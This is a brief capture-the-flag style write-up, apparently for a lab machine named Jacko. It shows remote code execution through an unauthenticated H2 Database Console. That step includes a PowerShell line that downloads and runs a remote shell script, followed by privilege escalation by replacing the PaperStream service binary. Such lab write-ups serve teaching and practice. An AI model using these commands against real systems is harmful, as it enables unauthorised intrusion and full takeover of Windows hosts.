# Jacko
> H2 Database + PaperStream

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

Port 8082 with accessible H2 Database Console.

## Exploitation

H2 Console with no authentication. Command execution via JDBC:

```
CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception { Runtime rt = Runtime.getRuntime(); String[] commands = {"cmd.exe", "/c", cmd}; Process proc = rt.exec(commands); return "done"; } $$;
CALL EXEC('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<IP>/shell.ps1'')"');
```

Reverse shell obtained.

## Privilege Escalation

PaperStream IP installed. Version vulnerable to local privilege escalation:

```
.\winPEAS.exe
```

```
# exploit PaperStream service with write permission
sc stop PaperStream
copy malicious.exe "C:\Program Files\PFU\PaperStream IP\..."
sc start PaperStream
```

SYSTEM obtained.
